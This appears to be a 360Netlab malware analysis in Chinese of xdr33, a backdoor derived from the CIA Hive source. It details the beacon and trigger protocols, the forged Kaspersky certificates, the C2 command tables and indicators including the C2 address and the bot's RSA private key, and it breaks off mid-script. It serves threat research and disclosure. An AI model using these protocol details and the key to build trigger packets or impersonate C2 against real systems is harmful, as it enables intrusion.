# 警惕：魔改后的CIA攻击套件Hive进入黑灰产领域
2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件`ee07a74d12c0bb3594965b51d0e45b6f`，流量监控系统提示它和IP`45.9.150.144`产生了SSL流量，而且双方都使用了**伪造的Kaspersky证书**，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。**这是我们首次捕获到在野的CIA HIVE攻击套件变种**，基于其内嵌Bot端证书的**CN=xdr33**， 我们内部将其命名为**xdr33**。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。

概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了**Client-Certificate Authentication**模式的SSL对流量做进一步的保护；从功能来说，主要有`beacon，trigger`两大任务，其中**beacon**是周期性向硬编码的Beacon C2上报设备敏感信息，执行其下发的指令，而**trigger**则是监控网卡流量以识别暗藏Trigger C2的特定报文，当收到此类报文时，就和其中的Trigger C2建立通信，并等待执行下发的指令。

功能示意图如下所示：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/7eb1405c-a766-401d-826a-342e5a4b0b3e.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_function.png)

Hive使用**BEACON\_HEADER\_VERSION**宏定义指定版本，在源码的Master分支上，它的值`29`，而xdr33中值为`34`，或许xdr33在视野之外已经有过了数轮的迭代更新。和源码进行对比，xdr33的更新体现在以下5个方面:

*   添加了新的CC指令
*   对函数进行了封装或展开
*   对结构体进行了调序，扩展
*   Trigger报文格式
*   Beacon任务中加入CC操作

xdr33的这些修改在实现上来看不算非常精良，再加上此次传播所所用的漏洞为N-day，因此我们倾向于排除CIA在泄漏源码上继续改进的可能性，认为它是黑产团伙利用已经泄漏源码魔改的结果。考虑到原始攻击套件的巨大威力，这绝非安全社区乐见，我们决定编写本文向社区分享我们的发现，共同维护网络空间的安全。

我们捕获的Payload的md5为`ad40060753bc3a1d6f380a5054c1403a`，它的内容如下所示：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/335ac79c-ccf5-4a27-9c89-efe5e0a637b1.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_logd.png)

代码简单明了，它的主要目的是：

1：下载下一阶段的样本并将其伪装成`/command/bin/hlogd`。

2：安装`logd`服务以实现持久化。

我们只捕获了一个X86 架构的xdr33样本，它的基本信息如下所示：

```
MD5:ee07a74d12c0bb3594965b51d0e45b6f
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
Packer: None

```

简单来说，**xdr33**在被侵入的设备运行时，首先解密所有的配置信息，然后检查是否有root/admin权限，如果没有，则输出`Insufficient permissions. Try again...`并退出；反之就初始化各种运行时参数，如C2，PORT，运行间隔时间等。最后通过**beacon_start**，**TriggerListen**两个函数开启Beacon，Trigger两大任务。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/acf8c8c8-c066-4fa8-9233-198482572a89.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_main.png)

下文主要从2进制逆向的角度出发，分析Beacon，Trigger功能的实现；同时结合源码进行比对分析，看看发生了哪些变化。

### 解密配置信息

xdr33通过以下代码片段**decode_str**解密配置信息，它的逻辑非常简单即**逐字节取反**。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/7a21677f-802e-4c4f-aeab-0bd319c4ba1e.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_decode.png)

在IDA中可以看到decode\_str的交叉引用非常多，一共了152处。为了辅助分析，我们实现了附录中IDAPython脚本 Decode\_RES，对配置信息进行解密。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/c1a7c77f-a01d-4271-bd3d-177e61c259e5.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_idaxref.png)

解密结果如下所示，其中有`Beacon C2` **45.9.150.144**，运行时提示信息，查看设备信息的命令等。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/f4bdddf7-a249-4a7a-abb4-e569ee7bae6f.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_config.png)

Beacon的主要功能是周期性的收集PID，MAC，SystemUpTime，进程以及网络相关的设备信息；然后使用bzip，XTEA算法对设备信息进行压缩，加密，并上报给C2；最后等待执行C2下发的指令 。

0x01: 信息收集
----------

*   MAC
    
    通过`SIOCGIFCON` 或 `SIOCGIFHWADDR`查询MAC
    
    [![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/ca96f6cb-2427-44e4-a2c0-66a1b680735c.png?raw=true)
    ](https://blog.netlab.360.com/content/images/2022/12/hive_mac-1.png)
    
*   SystemUpTime
    
    通过/proc/uptime收集系统的运行时间
    
    [![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/4ead9347-db58-41cf-97ad-44e78efe3123.png?raw=true)
    ](https://blog.netlab.360.com/content/images/2022/12/hive_uptime.png)
    
*   进程以及网络相关的信息
    
    通过执行以下4个命令收集**进程，网卡，网络连接，路由**等信息
    
    [![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/2e58542a-0cf1-4d2f-b722-171630268e2d.png?raw=true)
    ](https://blog.netlab.360.com/content/images/2022/12/hive_netinfo.png)
    

0x02: 信息处理
----------

Xdr33通过update_msg函数将不同的设备信息组合在一起

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/51473535-1a15-4266-9859-c30f9f8994c3.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_compose.png)

为了区别不同的设备信息，Hive设计了ADD_HDR，它的定义如下所示，上图中的“3，4，5，6”就代表了不同的Header Type。

```
typedef struct __attribute__ ((packed)) add_header {
	unsigned short type;
	unsigned short length;
} ADD_HDR;


```

那“3，4，5，6”具体代表什么类型呢？这就要看下图源码中Header Types的定义了。xdr33在此基础上进行了扩展，新增了0，9俩个值，分别代表**Sha1\[:32\] of MAC**，以及**PID of xdr33**。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/e6e0d50a-a941-43b2-93cc-edd79fc101b9.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_type.png)

xdr32在虚拟机中的收集到的部分信息如下所示，可以看出它包含了head type为0,1,2,7,9,3的设备信息。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/b924db5b-1bae-43ed-92d6-ba6f6857862c.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_deviceinfo.png)

值得一提的是type=0，Sha1\[:32\] of MAC，它的意思是取MAC SHA1的前32字节。以上图中的的mac为例，它的计算过程如下：

```
mac:00-0c-29-94-d9-43,remove "-"
result:00 0c 29 94 d9 43

sha1 of mac:
result:c55c77695b6fd5c24b0cf7ccce3e464034b20805

sha1[:32] of mac:
result:c55c77695b6fd5c24b0cf7ccce3e4640

```

当所有的设备信息组合完毕后，使用bzip进行压缩，并在头部增加2字节的beacon\_header\_version，以及2字节的OS信息。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/cd079467-1806-4c98-bae8-b60bd69312f2.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_devicebzip.png)

0x03: 网络通信
----------

xdr33与Beacon C2通信过程，包含以下4个步骤，下文将详细分析各个步骤的细节。

*   双向SSL认证
*   获取XTEA密钥
*   向C2上报XTEA加密的设备信息
*   执行C2下发的指令

### Step1: 双向SSL认证

所谓双向SSL认证，即要求Bot，C2要确认彼此的身份，从网络流量层面来看，可以很明显看到Bot，C2相互请求彼此证书并校验的过程。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/78198ceb-9f96-4800-9264-5fb98e72925e.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_certi.png)

xdr33的作者使用源码仓库中kaspersky.conf，以及thawte.conf 2个模板生成所需要的Bot证书，C2证书，CA证书。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/8f12a403-202a-404e-a2aa-12b62d0950ac.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_certconf.png)

xdr32中硬编码了DER格式的CA证书，Bot证书和PrivKey。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/0a601b5d-fd44-4486-951b-391f761b9a9b.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_sslsock.png)

可以使用`openssl x509 -in Cert -inform DER -noout -text`查看Bot证书，其中CN=xdr33，这正是此家族名字的由来。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/4ee80690-f383-4111-9389-a40a23b8b762.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_botcert.png)

可以使用`openssl s_client -connect 45.9.150.144:443` 查看C2的证书。Bot，C2的证书都伪装成与kaspersky有关，通过这种方式降低网络流量的可疑性。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/fa76c40a-0ab6-4168-b4c1-e51358ecbe23.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_c2cert.png)

CA证书如下所示，从3个证书的有效期来看，我们推测此次活动的开始时间在2022.10.7之后。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/27e8d6ee-6187-4f61-b739-ab1f00974fbc.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_ca.png)

### Step2: 获取XTEA密钥

Bot和C2建立SSL通信之后，Bot通过以下代码片段向C2请求XTEA密钥。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/00298d82-3019-4405-b882-ee01cb85abe7.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_teakey.png)

它的处理逻辑为：

1.  Bot向C2发送64字节数据，格式为"设备信息长度字串的长度（xor 5） + 设备信息长度字串（xor 5） + 随机数据"
    
2.  Bot从C2接收32字节数据，从中得到16字节的XTEA KEY，获取KEY的等效的python代码如下所示：
    
    ```
    XOR_KEY=5
    def get_key(rand_bytes):
    	offset = (ord(rand_bytes[0]) ^ XOR_KEY) % 15
    	return  rand_bytes[(offset+1):(offset+17)]
    
    ```
    

### Step3: 向C2上报XTEA加密的设备信息

Bot使用Step2获得的XTEA KEY 对设备信息进行加密，并上报给C2。由于设备信息较多，一般需要分块发送，Bot一次最多发送4052字节，而C2则会回复已接受的字节数。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/3890ad1c-4c70-4f0e-aa9e-be23cbcb5d33.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_teadevice.png)

另外值得一提的是，XTEA加密只在Step3中使用，后续的Step4中网络流量仅仅使用SSL协商好的加密加密套件，不再使用XTEA。

### Step4: 等待执行指令（xdr33新增功能）

当设备信息上报完毕后，C2向Bot发送8字节的本周期任务次数N，若N等于0就休眠一定时间，进入下一个周期的Beacon Task；反之就下发264字节的任务。Bot接收到任务后，对其进行解析，并执行相应的指令。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/b0430f72-a5c4-4e53-8630-48e4b71df90d.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_beaconwaitcmd.png)

支持的指令如下表所示：

| Index | Function |
| --- | --- |
| 0x01 | Download File |
| 0x02 | Execute CMD with fake name "\[kworker/3:1-events\]" |
| 0x03 | Update |
| 0x04 | Upload File |
| 0x05 | Delete |
| 0x08 | Launch Shell |
| 0x09 | Socket5 Proxy |
| 0x0b | Update BEACONINFO |

网络流量示例
------

### 实际中xdr33产生的step2流量

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/4e7b01bb-d339-4a72-99c5-a99a649be542.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_packet.png)

### step3中的交互，以及step4的流量

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/91acaa36-6b7e-4d10-8d84-cada72d220d7.png?raw=true)
](https://blog.netlab.360.com/content/images/2023/01/hive_packetB.png)

### 我们从中能得到什么信息呢？

1.  设备信息长度字串的长度，0x1 ^ 0x5 = 0x4
    
2.  设备信息长度，0x31,0x32,0x37,0x35 分别 xor 5得到 4720
    
3.  tea key `2E 09 9B 08 CF 53 BE E7 A0 BE 11 42 31 F4 45 3A`
    
4.  C2会确认BOT上报的设备信息长度，4052+668 = 4720,和第2点是能对应上的
    
5.  本周期任务数`00 00 00 00 00 00 00 00`，即无任务，所以不会下发264字节的具体任务
    

关于加密的设备信息，可以通过以下代码进行解密，以解密前8字节`65 d8 b1 f9 b8 37 37 eb`为例，解密后的数据为`00 22 00 14 42 5A 68 39`，包含了`beacon_header_version + os+ bzip magic`，和前面的分析能够一一对应。

```
import hexdump
import struct

def xtea_decrypt(key,block,n=32,endian="!"):
    v0,v1 = struct.unpack(endian+"2L", block)
    k = struct.unpack(endian+"4L",key)
    delta,mask = 0x9e3779b9,0xffffffff
    sum = (delta * n) & mask
    for round in range(n):
        v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
        sum = (sum - delta) & mask
        v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
    return struct.pack(endian+"2L",v0,v1)

def decrypt_data(key,data):
    size = len(data)
    i = 0
    ptext = b''
    while i < size:
        if size - i >= 8:
            ptext += xtea_decrypt(key,data[i:i+8])
        i += 8
    return ptext
key=bytes.fromhex("""
2E 09 9B 08 CF 53 BE E7  A0 BE 11 42 31 F4 45 3A
""")
enc_buf=bytes.fromhex("""
65 d8 b1 f9 b8 37 37 eb
""")

hexdump.hexdump(decrypt_data(key,enc_buf))

```

Trigger主要功能是监听所有流量，等待特定格式的Triggger IP报文，当报文以及隐藏在报文中的Trigger Payload通过层层校验之后，Bot就和Trigger Payload中的C2建立通信，等待执行下发的指令。

0x1: 监听流量
---------

使用函数调用**socket( PF\_PACKET, SOCK\_RAW, htons( ETH\_P\_IP ) )**，设定RAW SOCKET捕获IP报文，再通过以下代码片段对IP报文处理，可以看出Tirgger支持TCP,UDP，报文Payload最大长度为472字节。这种流量嗅探的实现方式会加大CPU的负载，事实上在socket上使用BPF-Filter效果会更好。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/4bc12cb6-b35b-4ec7-a05f-8564c2ecdfa1.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_snfpkt.png)

0x2: 校验Trigger报文
----------------

符合长度要求的TCP,UDP报文使用相同的处理函数check_payload进行进一步校验，

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/8c79796d-a63d-4d6b-a01c-bb3c1a256e1f.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_handxref.png)

**check_payload**的代码如下所示:  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/fcd992aa-ea60-4597-bad7-beecccc618f1.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_checkpayload.png)

可以看出它的处理逻辑：

1.  使用CRC16/CCITT-FALSE算法计算报文中偏移8到92的CRC16值，得到crcValue
    
2.  通过crcValue % 200+ 92得到crcValue在在报文中的偏移值，crcOffset
    
3.  校验报文中crcOffset处的数据是否等于crcValue，若相等进入下一步
    
4.  校验报文中crcOffset+2处的数据是否是127的整数倍，若是，进入下一步
    
5.  Trigger\_Payload是加密的，起始位置为crcOffset+12，长度为29字节。Xor\_Key的起始位置是crcValue%55+8，将2者逐字节XOR，就得到了Trigger_Paylaod
    

至此可以确定**Trigger报文格式**是这样的：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/af7632d7-5934-4ee7-8866-123a527eec06.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_triggerpkt-1.png)

0x3: 校验 Trigger Payload
-----------------------

如果Trigger报文通过校验，则通过check_trigger函数继续对Trigger Payload进行校验

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/11b92089-c6d3-49be-a356-5595c160de90.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_triggerfinal.png)

可以看出它的处理逻辑：

1.  取出Trigger Payload最后2字节，记作crcRaw
2.  将Trigger Payload最后2字节置0，计算其CRC16，记作crcCalc
3.  比较crcRaw，crcCalc，若相等，说明Trigger Payload在结构上是有效的

接着计算过Trigger Payload中的key的SHA1，和Bot中硬编码的SHA1 **46a3c308401e03d3195c753caa14ef34a3806593**进行比对。如果相等，说明Trigger Payload在内容是也是有效的，可以进入到最后一步，和Trigger Payload中的C2建立通信，等待执行其下发的指令。

至此可以确定**Trigger Payload**的格式是这样的：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/54d050b9-d15e-4cb3-a0de-1c2eb70490ad.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_triggerfmt-1.png)

0x4: 执行Trigger C2的指令
--------------------

当一个Trigger报文通过层层校验之后，Bot就主动和Trigger Payload中指定的C2进行通信，等待执行C2下发指令。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/27ea8c0c-5dd0-441a-a706-4335f63b8977.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_triggercmd.png)

支持的指令如下表所示：

| Index | Function |
| --- | --- |
| 0x00,0x00a | Exit |
| 0x01 | Download File |
| 0x02 | Execute CMD |
| 0x04 | Upload File |
| 0x05 | Delete |
| 0x06 | Shutdown |
| 0x08 | Launch SHELL |
| 0x09 | SOCKET5 PROXY |
| 0x0b | Update BEACONINFO |

值得一提的是，Trigger C2与Beacon C2在通信的细节上有所不同。Bot与Trigger C2在建立SSL隧道之后，会使用Diffie-Helllman密钥交换以建立共享密钥，这把钥匙用于AES算法创建第二层加密。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/6f5a108e-ce24-44a3-a1ec-aa1e132c6936.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_aes.png)

为了验证Trigger部分逆向分析的正确性，我们对xdr33的SHA1值进行了Patch，填入了**NetlabPatched,Enjoy!** 的SHA1，并实现了附录的GenTrigger代码，用以产生UDP类型Trigger 报文。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/37830075-3a91-47b1-967a-f6760a876467.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_patchbylab.png)

我们在虚拟机**192.168.159.133**运行Patch后的xdr33样本，构造C2为**192.168.159.128:6666**的Trigger Payload，并以UDP的方式发送给192.168.159.133。最终效果如下，可以看到xdr33所在的implanted host在收到UDP Trigger报文后，和我们预想中的一样，向预设的Trigger C2发起了通信请求，Cool！

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/33d90c85-1308-4ada-b4d9-fd90d9130270.png?raw=true)
](https://blog.netlab.360.com/content/images/2022/12/hive_vmware.png)

至此xdr33的分析告一段落，这是我们目前掌握的关于这个魔改攻击套件的情况。如果社区有更多线索，以及感兴趣的读者，可以在 [twitter](https://twitter.com/360Netlab) 或者通过邮件netlab\[at\]360.cn联系我们。

sample
------

```
ee07a74d12c0bb3594965b51d0e45b6f

patched sample

af5d2dfcafbb23666129600f982ecb87

```

C2
--

```
45.9.150.144:443

```

BOT Private Key
---------------

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6XthqPjU3XFu8/4PMVQ4iqJbleXmXhbVWMPhY/sTndEcO5vQ
mIMNJc1mISZTNPzddXSrj0h9GJe0ix0CIZID3bHyZHLiqb/ewylFmqSOVkviG/Je
o17UAqhsNGpVu/l8FM3qCHJE7z+wBqHdwVIZMt9vLaLti2KyJV+j1F1GTk8X2jcI
4DnnVKJE81rSafzaX2JBc6J6hovFMMP9IGb2LwRQMZNtZqSus6JMolhkO0dtvxXK
yTm1k79HL3PlZdgKt6HJFoukwkWND8NNTbcBXDWWDdJ42g/1I0Z7tMkdKFgfjUut
90LXKRRuENcUrbi75L6P2FRwPnqvVv+3N25MZQIDAQABAoIBADtguG57kc8bWQdO
NljqPVLshXQyuop1Lh7b+gcuREffdVmnf745ne9eNDn8AC86m6uSV0siOUY21qCG
aRNWigsohSeMnB5lgGaLqXrxnI1P0RogYncT18ExSgtue41Jnoe/8mPhg6yAuuiE
49uVYHkyn5iwlc7b88hTcVvBuO6S7HPqqXbDEBSoKL0o60/FyPb0RKigprKooTo/
KVCRFDT6xpAGMnjZkSSBJB2cgRxQwkcyghMcLJBvsZXbYNihiXiiiwaLvk4ZeBtf
0hnb6Cty840juAIGKDiUELijd3JtVKaBy41KLrdsnC+8JU3RIVGPtPDbwGanvnCk
Ito7gqUCgYEA+MucFy8fcFJtUnOmZ1Uk3AitLua+IrIEp26IHgGaMKFA0hnGEGvb
ZmwkrFj57bGSwsWq7ZSBk8yHRP3HSjJLZZQIcnnTCQxHMXa+YvpuEKE5mQSMwnlu
YH9S2S0xQPi1yLQKjAVVt+zRuuJvMv0dOZAOfdib+3xesPv2fIBu0McCgYEA8D4/
zygeF5k4Omh0l235e08lkqLtqVLu23vJ0TVnP2LNh4rRu6viBuRW7O9tsFLng8L8
aIohdVdF/E2FnNBhnvoohs8+IeFXlD8ml4LC+QD6AcvcMGYYwLIzewODJ2d0ZbBI
hQthoAw9urezc2CLy0da7H9Jmeg26utwZJB4ZXMCgYEAyV9b/rPoeWxuCd+Ln3Wd
+O6Y5i5jVQfLlo1zZP4dBCFwqt2rn5z9H0CGymzWFhq1VCrT96pM2wkfr6rNBHQC
7LvNvoJ2WotykEmxPcG/Fny4du7k03+f5EEKGLhodlMYJ9P5+W1T/SOUefRO1vFi
FzZPVHLfhcUbi5rU3d7CUv8CgYBG82tu578zYvnbLhw42K7UfwRusRWVazvFsGJj
Ge17J9fhTtswHMwtEuSlJvTzHRjorf5TdW/6MqMlp1Ntg5FBHUo4vh3wbZeq3Zet
KV4hoesz+pv140EuL7LKgrgKPCCBI7XXLQxQ8yyL51LlIT9H8rPkopb/EDif2paf
7JbSBwKBgCY8+aO44uuR2dQm0SIUqnb0MigLRs1qcWIfDfHF9K116sGwSK4SD9vD
poCA53ffcrTi+syPiUuBJFZG7VGfWiNJ6GWs48sP5dgyBQaVq5hQofKqQAZAQ0f+
7TxBhBF4n2gc5AhJ3fQAOXZg5rgNqhAln04UAIlgQKO69fAvfzID
-----END RSA PRIVATE KEY-----


```

BOT Certificate
---------------

```
-----BEGIN CERTIFICATE-----
MIIFJTCCBA2gAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE5NTAwN1oXDTIzMDMxNjE5NTAwN1owgYExCzAJBgNVBAYTAlJV
MR0wGwYDVQQKDBRLYXNwZXJza3kgTGFib3JhdG9yeTEUMBIGA1UEAwwLRW5naW5l
ZXJpbmcxDjAMBgNVBAMMBXhkcjMzMQ8wDQYDVQQIDAZNb3Njb3cxDzANBgNVBAcM
Bk1vc2NvdzELMAkGA1UECwwCSVQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQDpe2Go+NTdcW7z/g8xVDiKoluV5eZeFtVYw+Fj+xOd0Rw7m9CYgw0lzWYh
JlM0/N11dKuPSH0Yl7SLHQIhkgPdsfJkcuKpv97DKUWapI5WS+Ib8l6jXtQCqGw0
alW7+XwUzeoIckTvP7AGod3BUhky328tou2LYrIlX6PUXUZOTxfaNwjgOedUokTz
WtJp/NpfYkFzonqGi8Uww/0gZvYvBFAxk21mpK6zokyiWGQ7R22/FcrJObWTv0cv
c+Vl2Aq3ockWi6TCRY0Pw01NtwFcNZYN0njaD/UjRnu0yR0oWB+NS633QtcpFG4Q
1xStuLvkvo/YVHA+eq9W/7c3bkxlAgMBAAGjggFXMIIBUzAMBgNVHRMBAf8EAjAA
MB0GA1UdDgQWBBRc0LAOwW4C6azovupkjX8R3V+NpjCB+wYDVR0jBIHzMIHwgBTz
BcGhW/F2gdgt/v0oYQtatP2x5aGB1KSB0TCBzjELMAkGA1UEBhMCWkExFTATBgNV
BAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYDVQQKDBRU
aGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlvbiBTZXJ2
aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2VydmVyIENB
MSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29tggEAMA4G
A1UdDwEB/wQEAwIF4DAWBgNVHSUBAf8EDDAKBggrBgEFBQcDAjANBgkqhkiG9w0B
AQsFAAOCAQEAGUPMGTtzrQetSs+w12qgyHETYp8EKKk+yh4AJSC5A4UCKbJLrsUy
qend0E3plARHozy4ruII0XBh5z3MqMnsXcxkC3YJkjX2b2EuYgyhvvIFm326s48P
o6MUSYs5CFxhhp/N0cqmqGgZL5V5evI7P8NpPcFhs7u1ryGDcK1MTtSSPNPy3F+c
d707iRXiRcLQmXQTcjmOVKrohA/kqqtdM5EUl75n9OLTinZcb/CQ9At+5Sn91AI3
ngd22cyLLC3O4F14L+hqwMd0ENSjanX38iZ2EY8hMpmNYwPOVSQZ1FpXqrkW1ArI
lHEtKB3YMeSXQHAsvBQD0AlW7R7JqHdreg==
-----END CERTIFICATE-----


```

CA Certificate
--------------

```
-----BEGIN CERTIFICATE-----
MIIFXTCCBEWgAwIBAgIBADANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE0MTEzOFoXDTQ3MTAwMTE0MTEzOFowgc4xCzAJBgNVBAYTAlpB
MRUwEwYDVQQIDAxXZXN0ZXJuIENhcGUxEjAQBgNVBAcMCUNhcGUgVG93bjEdMBsG
A1UECgwUVGhhd3RlIENvbnN1bHRpbmcgY2MxKDAmBgNVBAsMH0NlcnRpZmljYXRp
b24gU2VydmljZXMgRGl2aXNpb24xITAfBgNVBAMMGFRoYXd0ZSBQcmVtaXVtIFNl
cnZlciBDQTEoMCYGCSqGSIb3DQEJARYZcHJlbWl1bS1zZXJ2ZXJAdGhhd3RlLmNv
bTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMfHJIl4/Xdo896Rlyqr
3VcKnLAAqIJkpgl90Z6bxUDpwa41H3ZDa7As4ZO9xa+lXGn9XB9u34TqJPkyhSKg
3wYK02KTCwVMI/gf506KpFvocTHpScnXs0xUoxsM8qEiDV2pTe447rmyaLyWcT5d
hbzkPl0WuDmEWMhfC2R9z4+mlsbwMAy9PN/JYzxz7cR48qj4j9hhEwkJ1+yJKXBV
AV9CdgLYfJXrA7A4Hxgc0ECKJmpovskv/DlxM8RxOsHfVtyG4ZgqmRraxUelirlf
tLj0fIkLaP7xvo1QSgiqQffbBOiDg9PN3H2wezFOmeDg9RIR6qvhzhyNpZjANiiC
JzMCAwEAAaOCAUIwggE+MA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFPMFwaFb
8XaB2C3+/ShhC1q0/bHlMIH7BgNVHSMEgfMwgfCAFPMFwaFb8XaB2C3+/ShhC1q0
/bHloYHUpIHRMIHOMQswCQYDVQQGEwJaQTEVMBMGA1UECAwMV2VzdGVybiBDYXBl
MRIwEAYDVQQHDAlDYXBlIFRvd24xHTAbBgNVBAoMFFRoYXd0ZSBDb25zdWx0aW5n
IGNjMSgwJgYDVQQLDB9DZXJ0aWZpY2F0aW9uIFNlcnZpY2VzIERpdmlzaW9uMSEw
HwYDVQQDDBhUaGF3dGUgUHJlbWl1bSBTZXJ2ZXIgQ0ExKDAmBgkqhkiG9w0BCQEW
GXByZW1pdW0tc2VydmVyQHRoYXd0ZS5jb22CAQAwDgYDVR0PAQH/BAQDAgGGMA0G
CSqGSIb3DQEBCwUAA4IBAQDBqNA1WFp15AM8l7oDgqa/YHvoGmfcs48Ak8YtrDEF
tLRyz1+hr/hhfR8Hm1hZ0oj1vAzayhCGKdQTk42mq90dG4tViNYMq4mFKmOoVnw6
u4C8BCPfxmuyNFdw9TVqTjdwWqWM84VMg3Cq3ZrEa94DMOAXm3QXcDsar7SQn5Xw
LCsU7xKJc6gwk4eNWEGxFJwS0EwPhBkt1lH4OD11jH0Ukr5rRJvh1blUiOHPd3//
kzeXNozA9PwoH4wewqk8bXZhj5ZA9LR7rm+5OrCoWXofgn1Gi2yd+LWWCrE7NBWm
yRelxOSPRSQ1fvAVvuRrCnCJgKxG/2Ba2DLs95u6IxYX
-----END CERTIFICATE-----


```

0x1 Decode_RES
--------------

```
import idautils
import ida_bytes

def decode(addr,len):
